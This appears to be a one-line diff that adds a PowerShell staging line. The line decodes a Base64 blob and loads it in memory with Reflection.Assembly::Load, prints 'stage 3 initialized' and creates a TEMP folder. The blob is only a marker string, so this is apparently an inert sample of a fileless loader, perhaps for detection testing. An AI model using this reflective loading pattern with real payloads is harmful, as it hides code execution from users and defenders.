@@ -1,0 +1,1 @@
+<# Stage transfer #> $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpkaG4wZDU2N2h6"); $ResultObject = [Reflection.Assembly]::Load($ManagedBytes); $ResultObject.GetTypes().Count; Write-Output "stage 3 initialized"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
